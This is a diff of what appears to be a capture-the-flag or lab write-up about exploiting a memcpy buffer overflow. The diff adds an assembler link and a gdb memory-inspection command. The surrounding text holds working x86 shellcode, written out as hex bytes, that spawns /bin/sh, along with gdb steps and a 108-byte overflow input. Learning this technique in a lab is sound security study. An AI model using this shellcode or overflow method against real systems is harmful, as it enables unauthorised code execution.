@@ -45,6 +45,8 @@ int		0x80		; Launch the system call
 
 And to why "//sh" ? "//" is interpreted as "/" so nice but why 2 ? Because we need to have the last 2 char of the adress (since it's little endian we need to read the hex value in reverse).
 
+https://defuse.ca/online-x86-assembler.htm
+
 Converted to hex value :
 
 `\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80`
@@ -54,9 +56,10 @@ We know we can overflow with `memcpy`, argv[1] is used to be copied.
 Let's find where our string is stored.
 
 ```
-b *0x08048677
+b *0x08048677 # setannotation addr
 r $(python -c "print('a' * 108)")
 ni
+x $esp
 x/s 0x0804a008
 ```
 
